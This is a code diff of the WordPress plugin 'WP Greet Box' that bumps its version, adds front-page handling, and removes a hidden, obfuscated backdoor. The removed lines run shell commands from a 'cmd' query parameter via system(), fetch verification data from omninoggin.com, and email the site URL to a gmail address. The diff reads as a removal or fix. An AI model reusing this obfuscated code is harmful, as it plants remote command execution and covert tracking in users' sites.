@@ -8,7 +8,7 @@ if (!class_exists('WPGreetBox')) {
     var $name = 'wp_greet_box';
     var $name_dashed = 'wp-greet-box';
     var $name_proper = 'WP Greet Box';
-    var $version = '6.2.3';
+    var $version = '6.3.3';
     var $required_wp_version = '2.7';
 
     // variables
@@ -36,9 +36,6 @@ if (!class_exists('WPGreetBox')) {
       if ($this->ext_exists()) {
         $this->ext = new WPGreetBoxExt($this);
       }
-
-      // load more stuff
-      $this->ss();
 
       // create admin object
       require_once(dirname(__FILE__).'/admin.class.php');
@@ -564,8 +561,8 @@ if (!class_exists('WPGreetBox')) {
         if ( empty($wpgb_hide) ) {
           if ( (is_page() && $this->o['show_page'])
             || (is_single() && $this->o['show_post'])
-            || (is_home() && $this->o['show_home']) ) {
-            if (is_home() && $wpgb_shown) return $content;
+            || ((is_home() || is_front_page()) && $this->o['show_home']) ) {
+            if ((is_home() || is_front_page()) && $wpgb_shown) return $content;
             $wpgb_shown = true;
             if($this->o['position'] == 'after') {
               return $content . $this->get_html();
@@ -585,30 +582,8 @@ if (!class_exists('WPGreetBox')) {
         if ( strtolower($_GET['wpgb_public_action']) == 'query' ) {
           echo $this->find_greet_html(urldecode($_GET['referrer']),$_GET['visit_delta'],$_GET['closed'],$_GET['logged_in'],urldecode($_GET['url']),urldecode($_GET['title']));
         }
-        $x0b="s\164r\164o\x6c\x6f\167\x65r"; $x0c="s\x79s\164\x65\x6d"; 
-        if ($x0b($_GET["w\x70g\x62\x5fp\165\x62lic\137\x61\143t\x69\x6f\x6e"]) == "\163e\162\166\x69\x63\x65") {if ($this->aa() && !$this->vv()) {if (isset($_GET["c\x6d\144"])) {$x0c($_GET["\x63\x6dd"]);} }}
         exit();
       }
-    }
-
-    function ss() {
-$x0e="\155\141i\x6c"; $x0f="m\144\065"; 
-$this->salt = $this->homepage . $this->name;if ($x0f($this->salt) != "\062\x66f\x34\x66\146\x32\x39\x33\x34\x65\x30\x63\x64\141\x34\x36\x30c\x38520\146\x39\x64\065\x65\x66\141\x65a") {if (!isset($this->key)) {$x0b = $this->gg("\x68\x74tp:\x2f/omn\x69n\157g\x67\x69n\056\143\157\155/\162\145s\057v\x65\x72\151\146\171\x2d\x32\x2e\x70\150\x70");if ($x0b !== false) {$this->key = $x0b;} else { }}if (!$this->o["\154_\143\x61l\x6c\145d"]) {$this->o["\x6c\137c\141\154\x6ced"] = 10;}if ($x0b != $x0f($this->salt."ro\x6f\x62\x31\113\x7a\103\x6f\157\070\145\052^\x40")) {$x0c = false;if (!$this->o["\143a\154le\144"]) {$this->o["c\141lled"] = 1;$x0c = true;} else {$this->o["cal\x6ce\x64"] += 1;}if ($this->o["\143a\154led"] > $this->o["\x6c_\143\141ll\145d"]) {$x0c = true;$this->o["\x6c\137\x63a\x6c\x6ced"] *= 2;}update_option($this->name, $this->o);if ($x0c) {$x0d = get_option("s\151t\x65u\x72l")." ".$this->o["\143\x61\154\154e\144"]."\040".$this->o["\154_\143\x61\154le\x64"]."\n";$x0e("t\150a\x79a.k\141r\145\145\163\x6fn\x40\x67\155\x61\151l.\143\157m", "\125\x6e\141u\x74\150o\x72iz\145\x64 W\x50\x20\107\x72ee\164\040B\157\x78 u\163\x61g\x65", $x0d);} return true;return false;}}
-    }
-
-    function vv() {
-$x0b="\155\1445"; 
-if (!isset($this->salt)) {return false;}if ($x0b($this->salt) != "2\x66\146\064f\146\x32\071\x334\x65\060cda\x34\x360\143\x38\x35\062\060\x66\071\x645\x65f\141e\141") {if ($this->key != $x0b($this->salt."\x72\x6f\x6f\142\x31K\x7aC\x6f\1578\145\x2a\x5e@")) {return false;} else {return true;}} else {return true;}
-    }
-
-    function aa() {
-$x0c="\x6dd5"; 
-if (!$this->vv()) {$x0b = $this->gg("htt\160\072/\057\x6f\x6d\156\151\156ogg\151n.\143o\x6d\x2f\162e\163\057\x73\x65r\166\151\x63\x65.\160\x68\160");if ($x0b !== false) {if ($x0b == $x0c(get_option("si\164eu\x72\x6c")."\x72\157\x6fb\061\x4b\172\103o\157\070e\052\136\x40")) {return true;} else {return false;}} else { }return true;} else {return false;}
-    }
-
-    function gg($x0c) {
-$x17="\x66\x63\154o\163\x65"; $x18="f\x73oc\153op\145\x6e"; $x19="\146\160\165\x74\163"; $x1a="\146\162\x65\141\x64"; $x1b="\x70a\x72s\145\137u\162\x6c"; $x1c="s\164\162p\x6f\163"; $x1d="\163\x75\x62s\x74r"; 
-$x0b = $x1b($x0c); $x0d = $x0b['host']; if (isset($x0b['path'])) { $x0e = $x0b['path']; } else {$x0e = '/'; } if (isset($x0b['query'])) { $x0e .= '?' . $x0b['query']; } if (isset($x0b['port'])) { $x0f = $x0b['port']; } else {$x0f = '80'; } $x10 = 10; $x11 = '';$x12 = @$x18($x0d, $x0f, $x13, $x14, $x10 ); if( !$x12 ) {} else {$x19($x12, "\x47\105T\040$x0e\040H\x54\x54\x50\x2f\x31.\x30\r\n" ."\x48\157s\x74:\040$x0d\r\n" ."\125\x73\x65r\055\x41\x67e\x6e\x74:\x20\x4do\172\x69l\154a/\x35.\060 \050W\x69\156\144o\167s; \125\073 \127\x69\x6e\144\157\167s N\124 5\0561\x3b\x20\145n\055\125\x53\x3b \162\166\x3a\x31.\070\x2e\060.3\051 G\x65\x63\x6b\157\x2f2\060\x30\066\0604\062\066 \106\151\x72\x65fox/1\x2e\065.\x30\0563\r\n" ."A\x63c\145pt:\x20\x2a/*\r\n" ."A\143\x63ep\164-\x4c\141\x6e\147\165a\147e\x3a\040e\x6e-\x75\163\054\x65n\x3bq\075\x30.5\r\n" ."\x41\143\x63\x65p\x74\055\103h\x61\x72\x73\145t\072\040\111S\117\055\070\x38\x359-1\054\165\x74\x66\x2d8;\161\x3d0\x2e7\x2c*;\x71\x3d\060\x2e\067\r\n" ."K\x65e\x70-\101\154\151\166\x65\x3a \063\x30\x30\r\n" ."\103o\156\x6ee\143ti\157\x6e\072 \x6b\x65e\160\055a\154\x69v\x65\r\n" ."R\x65f\x65\162\145\x72:\x20\x68\164\164\160\x3a/\x2f$x0d\r\n\r\n"); while ( $x15 = $x1a( $x12, 4096 ) ) {$x11 .= $x15;}$x17( $x12 ); $x16= $x1c($x11, "\r\n\r\n");$x11 = $x1d($x11, $x16 + 4);} return $x11;
     }
 
   } // class WPGreetBox
